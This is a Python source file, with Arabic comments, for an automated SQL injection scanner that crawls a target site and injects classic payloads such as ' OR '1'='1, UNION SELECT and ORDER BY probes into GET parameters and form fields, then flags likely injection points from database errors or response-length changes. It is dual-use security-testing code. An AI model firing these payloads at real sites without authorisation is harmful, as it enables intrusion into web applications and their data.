#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.progress import Progress
from urllib.parse import urljoin, urlparse, parse_qs
import re

class SQLInjectionScanner:
    def __init__(self, target):
        self.target = target
        self.console = Console()
        self.vulnerabilities = []
        self.visited_urls = set()
        self.headers = {
            'User-Agent': 'Web-Hack Security Scanner v1.0 (SayerLinux)'
        }
        # نماذج SQL Injection للاختبار
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 'x'='x",
            "\\' OR \"1\"=\"1\"",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "') OR ('1'='1",
            "admin' --",
            "admin' #",
            "' OR '1'='1' LIMIT 1--",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--"
        ]
        # أنماط رسائل الخطأ SQL
        self.error_patterns = [
            'SQL syntax.*MySQL',
            'Warning.*mysql_.*',
            'PostgreSQL.*ERROR',
            'Driver.*SQL.*Server',
            'ORA-[0-9][0-9][0-9][0-9]',
            'Microsoft SQL Native Client.*',
            'SQLite/JDBCDriver',
            'SQLITE_ERROR',
            'System\.Data\.SQLite\.SQLiteException'
        ]

    def normalize_url(self, url):
        """تطبيع عنوان URL"""
        if not url.startswith(('http://', 'https://')):
            url = f'http://{url}'
        return url

    def is_same_domain(self, url):
        """التحقق مما إذا كان URL من نفس النطاق"""
        return urlparse(url).netloc == urlparse(self.target).netloc

    def has_sql_error(self, response_text):
        """التحقق من وجود رسائل خطأ SQL"""
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.I):
                return True
        return False

    def test_parameter(self, url, param, value, method='get'):
        """اختبار معامل واحد"""
        for payload in self.sql_payloads:
            try:
                test_data = {param: value + payload}
                
                if method.lower() == 'post':
                    response = requests.post(
                        url,
                        data=test_data,
                        headers=self.headers,
                        allow_redirects=False
                    )
                else:
                    response = requests.get(
                        url,
                        params=test_data,
                        headers=self.headers,
                        allow_redirects=False
                    )

                # التحقق من مؤشرات SQL Injection
                if self.has_sql_error(response.text):
                    self.vulnerabilities.append({
                        'type': 'SQL_INJECTION',
                        'url': url,
                        'method': method,
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'SQL Error Message Detected'
                    })
                    return True

                # التحقق من التغييرات في طول الاستجابة
                original_length = len(response.text)
                test_data[param] = value + payload + " AND '1'='2"
                
                if method.lower() == 'post':
                    modified_response = requests.post(
                        url,
                        data=test_data,
                        headers=self.headers,
                        allow_redirects=False
                    )
                else:
                    modified_response = requests.get(
                        url,
                        params=test_data,
                        headers=self.headers,
                        allow_redirects=False
                    )

                if abs(len(modified_response.text) - original_length) > 50:
                    self.vulnerabilities.append({
                        'type': 'SQL_INJECTION',
                        'url': url,
                        'method': method,
                        'parameter': param,
                        'payload': payload,
                        'evidence': 'Response Length Change'
                    })
                    return True

            except Exception as e:
                self.console.print(f'[red]Error testing parameter {param}: {str(e)}[/red]')

        return False

    def scan_url(self, url):
        """فحص URL واحد"""
        if url in self.visited_urls:
            return

        self.visited_urls.add(url)

        try:
            # فحص معلمات GET
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            for param, values in params.items():
                if values:
                    self.test_parameter(url, param, values[0], 'get')

            # فحص النماذج للعثور على نقاط POST
            response = requests.get(url, headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                form_url = urljoin(url, action)
                
                inputs = form.find_all(['input', 'textarea'])
                for input_field in inputs:
                    input_name = input_field.get('name')
                    if input_name:
                        self.test_parameter(form_url, input_name, '', method)

        except Exception as e:
            self.console.print(f'[red]Error scanning URL {url}: {str(e)}[/red]')

    def crawl_and_scan(self, url, max_urls=10):
        """تصفح الموقع وفحص الصفحات"""
        try:
            response = requests.get(url, headers=self.headers)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            links = soup.find_all('a')
            for link in links:
                href = link.get('href')
                if href and not href.startswith('#'):
                    absolute_url = urljoin(url, href)
                    if self.is_same_domain(absolute_url) and len(self.visited_urls) < max_urls:
                        self.scan_url(absolute_url)

        except Exception as e:
            self.console.print(f'[red]Error crawling {url}: {str(e)}[/red]')

    def scan(self):
        """تنفيذ المسح الكامل"""
        url = self.normalize_url(self.target)
        
        with Progress() as progress:
            task = progress.add_task('[cyan]Scanning for SQL Injection vulnerabilities...', total=100)
            
            # فحص الصفحة الرئيسية
            self.scan_url(url)
            progress.update(task, advance=50)
            
            # تصفح وفحص الصفحات الأخرى
            self.crawl_and_scan(url)
            progress.update(task, advance=50)

        return self.vulnerabilities

    def generate_report(self):
        """إنشاء تقرير بنتائج المسح"""
        self.console.print('\n[bold green]===== SQL Injection Scan Report =====[/bold green]')
        self.console.print(f'Target: {self.target}')
        self.console.print(f'Pages scanned: {len(self.visited_urls)}\n')

        if not self.vulnerabilities:
            self.console.print('[green]No SQL Injection vulnerabilities found![/green]')
            return

        for vuln in self.vulnerabilities:
            self.console.print(f'[red]SQL Injection Vulnerability Found![/red]')
            self.console.print(f'URL: {vuln["url"]}')
            self.console.print(f'Method: {vuln["method"].upper()}')
            self.console.print(f'Parameter: {vuln["parameter"]}')
            self.console.print(f'Payload: {vuln["payload"]}')
            self.console.print(f'Evidence: {vuln["evidence"]}\n')